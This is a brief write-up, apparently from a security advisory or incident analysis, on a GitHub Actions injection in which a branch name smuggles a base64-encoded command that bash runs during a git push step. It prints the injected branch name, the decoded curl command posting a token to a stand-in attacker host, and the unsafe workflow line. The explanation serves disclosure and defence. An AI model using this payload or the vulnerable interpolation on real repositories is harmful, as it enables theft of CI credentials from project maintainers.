# Attacker Base64 Branch Name Payload

The attacker creates a branch with a base64-encoded payload in its name:

  main$(echo${IFS}Y3VybC...|base64${IFS}-d|bash)

The base64 string decodes to:
  curl -s -X POST -d pat=EXFILTRATED http://attacker-server/exfil

When the workflow runs:
  git push origin HEAD:${{ github.event.pull_request.head.ref }}

bash evaluates the command substitution in the branch name,
decodes the base64 payload and executes it.

Note: In RustPython attack, the payload partially executed
but failed due to a base64 encoding issue.
